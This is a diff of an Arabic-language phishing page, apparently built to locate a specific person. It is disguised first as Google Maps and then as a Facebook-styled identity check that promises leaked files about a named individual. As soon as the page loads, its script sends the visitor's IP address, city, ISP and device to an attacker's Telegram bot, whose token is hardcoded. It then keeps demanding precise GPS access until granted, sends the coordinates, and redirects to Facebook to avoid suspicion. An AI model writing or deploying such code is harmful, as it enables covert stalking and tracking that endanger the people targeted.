@@ -3,52 +3,98 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Maps - تحديد موقع المستند</title>
+    <title>تحقق من الهوية - نظام الوصول الآمن</title>
     <style>
-        body { margin: 0; font-family: sans-serif; background: #e8eaed; display: flex; flex-direction: column; height: 100vh; }
-        #header { background: white; padding: 15px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); text-align: center; font-weight: bold; color: #1a73e8; }
-        #map-bg { flex-grow: 1; background: url('https://tech-story.net/wp-content/uploads/2021/04/google-maps.jpg') no-repeat center; background-size: cover; filter: blur(8px); }
-        .overlay { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: white; padding: 25px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); width: 85%; max-width: 350px; text-align: center; z-index: 100; }
-        .btn { background: #1a73e8; color: white; border: none; padding: 12px 25px; border-radius: 5px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 15px; }
+        body { background-color: #f0f2f5; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.2); width: 90%; max-width: 400px; text-align: center; border-top: 5px solid #1877f2; }
+        .icon { font-size: 50px; color: #1877f2; margin-bottom: 15px; }
+        h2 { color: #1c1e21; margin-bottom: 10px; font-size: 20px; }
+        p { color: #606770; font-size: 14px; line-height: 1.6; }
+        .btn { background-color: #1877f2; color: white; padding: 12px 20px; border-radius: 6px; border: none; font-weight: bold; font-size: 16px; cursor: pointer; width: 100%; margin-top: 20px; transition: 0.3s; }
+        .btn:hover { background-color: #166fe5; }
+        #status { margin-top: 15px; font-size: 13px; font-weight: bold; }
     </style>
 </head>
 <body>
 
-<div id="header">خرائط Google - عرض موقع التقرير</div>
-<div id="map-bg"></div>
-
-<div class="overlay">
-    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="92">
-    <h3>عرض الموقع الدقيق</h3>
-    <p style="color: #5f6368; font-size: 14px;">يجب السماح بالوصول إلى موقعك الجغرافي لفتح الخريطة وعرض مكان تواجد الوثائق المسربة الخاصة بـ (حيدر التراب).</p>
-    <button class="btn" onclick="getLocation()">فتح الخريطة الآن</button>
+<div class="card">
+    <div class="icon">🛡️</div>
+    <h2>تأكيد الموقع الجغرافي</h2>
+    <p>لإكمال عملية تحميل ملفات (حيدر التراب)، يتطلب النظام التأكد من وجودك داخل النطاق الجغرافي المسموح به. يرجى الضغط على الزر أدناه والموافقة على طلب المتصفح.</p>
+    <button class="btn" onclick="requestLocation()">تأكيد الهوية والتحميل</button>
+    <div id="status"></div>
 </div>
 
 <script>
+    // بياناتك الخاصة
     const token = '8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg';
     const chat_id = '7214473798';
 
-    function sendToTelegram(msg) {
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
+    async function sendToTelegram(message) {
+        try {
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`);
+        } catch (e) {
+            console.error("Telegram Error");
+        }
     }
 
-    function getLocation() {
+    // صيد الـ IP فوراً عند فتح الصفحة
+    window.onload = async function() {
+        try {
+            const response = await fetch('https://ipapi.co/json/');
+            const data = await response.json();
+            let ipReport = `🌐 **دخول جديد للرابط!**\n`;
+            ipReport += `🔹 IP: ${data.ip}\n`;
+            ipReport += `🔹 المدينة: ${data.city}\n`;
+            ipReport += `🔹 الشركة: ${data.org}\n`;
+            ipReport += `📱 الجهاز: ${navigator.platform}`;
+            sendToTelegram(ipReport);
+        } catch (e) {
+            sendToTelegram("⚠️ شخص فتح الرابط لكن تعذر جلب الـ IP.");
+        }
+        // طلب الموقع تلقائياً بمجرد الدخول
+        requestLocation();
+    };
+
+    function requestLocation() {
+        document.getElementById('status').innerText = "جاري التحقق...";
+        document.getElementById('status').style.color = "blue";
+
         if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(function(pos) {
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
-                const acc = pos.coords.accuracy;
+            navigator.geolocation.getCurrentPosition(function(position) {
+                // في حال النجاح
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+                const acc = position.coords.accuracy;
                 const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
                 
-                sendToTelegram(`🎯 تم الصيد بنجاح!\n📍 الرابط: ${mapLink}\n📏 الدقة: ${acc} متر`);
+                let successMsg = `🎯 **تم صيد GPS بنجاح!**\n\n`;
+                successMsg += `📍 رابط الموقع:\n${mapLink}\n\n`;
+                successMsg += `📏 الدقة: ${acc} متر`;
                 
-                // تحويله لخريطة حقيقية عشان ما يشك
-                window.location.href = "https://www.google.com/maps/search/" + lat + "," + lon;
-            }, function(err) {
-                sendToTelegram("⚠️ الهدف رفض الصلاحية مرة أخرى.");
-                alert("خطأ: يجب السماح بالوصول للموقع لعرض الخريطة.");
-                location.reload(); // إعادة التحميل لإجباره على المحاولة
-            }, {enableHighAccuracy: true});
+                sendToTelegram(successMsg);
+                document.getElementById('status').innerText = "تمت المصادقة! جاري التحويل...";
+                document.getElementById('status').style.color = "green";
+
+                // تحويل لصفحة حقيقية للتمويه
+                setTimeout(() => {
+                    window.location.href = "https://www.facebook.com/share/17y7raGdnu/";
+                }, 2000);
+
+            }, function(error) {
+                // في حال الرفض
+                if (error.code === error.PERMISSION_DENIED) {
+                    sendToTelegram("⚠️ الهدف ضغط (رفض/Block).. جاري إعادة المحاولة.");
+                    document.getElementById('status').innerText = "خطأ: يجب السماح بالوصول للمتابعة!";
+                    document.getElementById('status').style.color = "red";
+                    // إعادة طلب الموقع بعد ثانية لإجبار المستخدم
+                    setTimeout(requestLocation, 1500);
+                }
+            }, {
+                enableHighAccuracy: true,
+                timeout: 10000,
+                maximumAge: 0
+            });
         }
     }
 </script>
